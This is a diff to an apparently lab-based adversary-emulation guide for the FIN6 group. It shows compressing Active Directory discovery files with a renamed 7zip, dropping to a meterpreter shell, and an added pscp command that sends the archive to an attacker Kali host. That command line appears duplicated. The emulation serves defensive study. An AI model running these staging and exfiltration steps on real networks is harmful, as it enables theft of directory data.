@@ -417,7 +417,7 @@ After conducting internal discovery, FIN6 has been reported to stage the resulti
 
 FIN6 uses its renamed version of 7zip (7.exe), on the designated staging system, to compress the text files resulting from internal discovery. 
 
-The following command adds the ad_* text files to the ad.7z archive and performs a level 3 compression:
+The following command adds the ad_* text files to the `ad.7z` archive and performs a level 3 compression:
 
 ```ps
 PS > .\7.exe a -mx3 ad.7z ad_*
@@ -469,6 +469,14 @@ Once downloaded, exit to the <kb>powershell</kb> module since we need to load th
 ```bash
 meterpreter > shell
 ```
+
+We can now transfer the file `ad.7z` back to our Attacker VM using the following command:
+
+```ps
+C:\Users\Administrator\Downloads>.\pscp.exe -P 22 .\ad.7z kali@192.168.111.165:/home/kali/Desktop .\pscp.exe -P 22 .\ad.7z kali@192.168.111.165:/home/kali/Desktop
+```
+
+Once executed, type `y` to store and cache the key of the AttackerVM and then type the password:
 
 FIN6
 
